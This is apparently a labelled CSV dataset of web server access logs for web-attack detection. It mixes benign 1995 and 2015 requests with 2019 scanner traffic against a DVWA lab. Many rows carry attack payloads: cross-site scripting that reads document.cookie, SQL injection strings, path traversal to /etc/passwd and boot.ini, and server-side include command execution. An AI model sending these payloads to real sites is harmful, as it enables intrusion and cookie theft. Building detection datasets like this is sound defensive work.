Remote_host,Identd,REMOTE_USER,Date_time,Method,Path,Version,Status,Length,Label
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/?password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?password=OR+1%3D1,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:15 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/forgot_password.php?email=\\\""><script>alert(document.cookie)</script>",HTTP/1.1,404,510,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/administrator/gallery/uploadimage.php?directory=\\\""<script>alert(document.cookie)</script>",HTTP/1.1,404,528,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:10 +0000,GET,/dvwa/css/main.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,HTTP/1.1,200,4278,3.0
109.169.248.247,-,-,13/Dec/2015:12:43:46 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
87.117.14.0,-,-,13/Dec/2015:12:59:58 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/modules/Forums/bb_smilies.php?bgcolor1=\\\""><script>alert('Vulnerable')</script>",HTTP/1.1,404,520,1.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa?query=query+AND+1%3D1+--+,HTTP/1.1,301,572,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/?user_token=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:22:01 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/images/logo.png?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,HTTP/1.1,200,5275,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:47 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?Login=1%27+OR+1+OR+1%3D%27,HTTP/1.1,302,300,2.0
leet.cts.com,-,-,01/Jul/1995:00:12:08 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:53 +0000,GET,/docs/DVWA_v1.3.pdf,HTTP/1.1,200,422251,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/robots.txt?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,200,254,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:41 +0000,GET,/dvwa/css/,HTTP/1.1,200,1703,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1_professionnel.asp?n=/.../.../.../.../.../.../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,404,515,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/login_logo.png?query=query%22+UNION+ALL+select+NULL+--+,HTTP/1.1,200,9319,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/?username=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E,HTTP/1.1,302,300,1.0
78.81.240.26,-,-,13/Dec/2015:12:19:37 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/?username=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
ppp160.iadfw.net,-,-,01/Jul/1995:00:18:44 -0400,GET,/htbin/wais.pl,HTTP/1.0,200,308,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,POST,/setup.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/images/RandomStorm.png?query=query%27+AND+%271%27%3D%271%27+--+,HTTP/1.1,200,4746,2.0
212.7.217.50,-,-,12/Dec/2015:23:34:36 +0100,GET,/administrator/,HTTP/1.1,200,4267,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:37 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:32 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum-ra.asp?n=/../../../../../../../../../../../boot.ini,HTTP/1.1,404,503,3.0
95.78.52.106,-,-,13/Dec/2015:05:46:56 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
ix-dc10-19.ix.netcom.com,-,-,01/Jul/1995:00:16:29 -0400,GET,/,HTTP/1.0,200,7074,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
ppp4.sunrem.com,-,-,01/Jul/1995:00:14:31 -0400,GET,/htbin/cdt_main.pl,HTTP/1.0,200,3214,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
dnet018.sat.texas.net,-,-,01/Jul/1995:00:12:33 -0400,GET,/icons/text.xbm,HTTP/1.0,200,527,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:33 +0000,GET,/docs/DVWA_v1.3.pdf?query=query%27+OR+%271%27%3D%271%27+--+,HTTP/1.1,200,422251,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
94.233.8.101,-,-,13/Dec/2015:03:14:58 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>,HTTP/1.1,404,513,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/?Login=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../../../../../../../../../../../../../boot.ini&amp;page=1,HTTP/1.1,404,515,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/?password=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:46 +0000,GET,/dvwa/js/add_event_listeners.js?query=lIKdStFcukytvKnpgEojgTdKEvhkBDsITpKEyYWTgdqCjosbARJkEWjqaWQHJlfcvtKMPROVteTWVhHejFbMpkKkNRshfkZeweONBOLlTOcWEuVjHtJKrKCdLZEZdBvsvnZuJuFjtapHBogAhxueuQRcZKmGtZomHFCZMGjqTpMXKMZlqAXcLRolIoUMtGwjxAasFirkJXMKKULuaCKLMYkQCKwWnyHrwNpMlCvurRgFgQWqMauoPHDGjHoIqsebQIXnvktrkCSvBHkUonCwYDPtIjyenRasRhopVBRPrNhGAWDiFWhAPHVrJTssVqWOMnWqUoXtAkMOFYmOCmOdXSSUNXcsxCwIEIyiZkOmAuESfuZBpuQHBrFPEVqvJQZHHmlCGFZSNEcFpCFMcXBKjYSKIEKOwGyFCbMtVwmtLoWpeqWSukvVvcQhexMCOMgJEUAPASDCjKfNCkShEcWItVQCfVgUCtBUsPgykpBKmNfbBmJGsuFPvTpJvaoTmfMuHVTlIheIKpKPHcckBRHWNavPxRdjTwLvxaPhaMbxTvRUFeBsLbIHrHoaUxmlMNRqOTFgoHYEEuIBUvadeewXAXqerhkANMbHxYgycISYspFtJGEeowTIyDFpAcwOEhbkCZwSDYedJEQwYCBaiDffiFuJcjFeEIsNibdRQZCBXsEvvlVYBGyUaQnZXvdDDOUbHmiKnEfDERqYfcCliZnCyLDkfjTCKqprWKCsiKbihgnGChgAdpBRkQCvPDgEbvQfQwCHxQsrYeSPfKEAiRMpMgojlBuCVQhHtHEdOkkWAXORXkOJoMxwAdTOjeaeGElqZvpcajgaFqGgMuwfsnYuhtrsDRUXkTwSmPLBmSIVJqaTVVVAxJylXLbqhKGxHpLRgVrppOVyoascqwKGXHWELmhBgZvkYrkPwyAdfETxveZULubcKDVKiMpVNGdXoxagrwJFDTXayEYtbENDBMJKwDutOqVoAnZfxJIAlYSjDGaJhffpQLMgVrisJpZkHldDAKjbVUtCpXFTDXUXwdtCVMcuaMZEjJcOCZoWurDwXnBpfksZpPFtonSijAYXpTlMWMoIihIVYCVgWkOrgEpPNJxdGDBPvgfcqjDvmnvoLDgNahttyMsbTOukAflxBfeUSUyJvLcAXpoMOnkmYoHajqfNdCiCdYgqnTWYqKVnOSwWPGQbFwOjYkejxlxiNObiPQxPDTOtRZrtPVxKwLCbKWrYOZjGAnKithGNQkFsYEmMCwMRFDQMYTjcjvRAfVNDACKyTdIpqqBeIosFwnXFQnMpMwLVYSsnHYBTImdufinMEeHhccxQcfdnjeXyZgtgOxCTavJlwZkNKnaDgjSXbZBpaakuBZnuJgeYXNjGnZtBAviDLbrZGFTHshGGSuCjFgSAhycrOoejtLvqQeqSaRZuUlsYMDPehGcXbEausiPWSqcVyuPFSOPjnMdSORXQcCIWyPvVOCKSxCxEsEPVnLgQsumXOARauBjlhsZYVsLVXQnNfdhUZTgkeHnjyKxxnAoYpAwtrEVRiqQnDHcLwGsQyXFZjwxWmIiVFcvxKEJtOtMiHiQbxsuiLgQEgbycCttbqjLyQwQMcbuxmRxUOFdUpToMYFeWHxqrhIydCRmTJFnliHhNjGPteeivcCmUiXsfHYDYJwRuvQAqPunnhFrjrZEXwGSSpGMaQvbIrxCVIGGUvgBDLBxmZZLedFudIqPuFAffKNeGSmsDSsjyquMHSHVXOcSprMrveTiJeXOrjlgWpEgevDxQWRasNcQVaqtFrKMWCYXoQnEvItbgucMfhSjSZMQhBscLWOUfbmjNgsdXxaqMFxqlyRYvLOmbIfvqxFjqmWIWJNIjkQSCqSmynovVxkejZFsKqoELnAVRmGGOfjNTjPtTUoqOhQksQMNdPyTRtyeqVlvcaEiFVQFGblFAFXlypwXgmEiFNLVRsnoGemKwLNvwBpParyhkwiSxIpwCTMiYPpFhAbBOWfZhoERNHXnWvqZNXxgWBBpHwSTigIrLoZMYhhABjVwgZGMrEQdPKjhqdKJHPehNuLiSDSKXbGGrxsBPqETMyHtJPEHRDFXq,HTTP/1.1,200,858,2.0
